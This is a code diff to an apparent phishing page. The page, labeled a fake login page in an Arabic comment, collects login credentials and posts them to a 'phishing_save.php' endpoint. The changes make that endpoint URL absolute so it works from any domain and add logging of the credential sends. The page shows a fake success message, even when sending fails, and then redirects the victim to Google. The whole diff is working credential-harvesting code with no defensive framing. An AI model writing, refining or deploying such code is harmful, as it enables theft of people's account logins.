@@ -80,7 +80,6 @@
     }
     .btn:active { transform: translateY(0); }
 
-    /* صفحة تسجيل الدخول المزيفة */
     .login-form { display: none; text-align: right; }
     .login-form.active { display: block; animation: slideIn 0.4s ease; }
     .login-form h2 {
@@ -239,23 +238,27 @@
                 timestamp: Date.now()
             };
 
-            // إرسال البيانات للسيرفر
-            fetch('/phishing_save.php', {
+            // ✅ المسار المطلق — يشتغل من أي دومين
+            const API_URL = window.location.origin + '/phishing_save.php';
+            console.log('📤 Sending credentials to:', API_URL);
+
+            fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).then(() => {
+            }).then((res) => {
+                console.log('✅ Server responded:', res.status);
                 setTimeout(() => {
                     document.getElementById('loginView').classList.remove('active');
                     document.getElementById('successView').classList.add('active');
 
-                    // تحويل وهمي بعد 3 ثواني
                     setTimeout(() => {
                         window.location.href = 'https://www.google.com';
                     }, 3000);
                 }, 800);
-            }).catch(() => {
-                // حتى لو فشل الإرسال — نعرض النجاح
+            }).catch((err) => {
+                console.error('❌ Error:', err);
+                // حتى لو فشل — نعرض النجاح
                 document.getElementById('loginView').classList.remove('active');
                 document.getElementById('successView').classList.add('active');
                 setTimeout(() => {
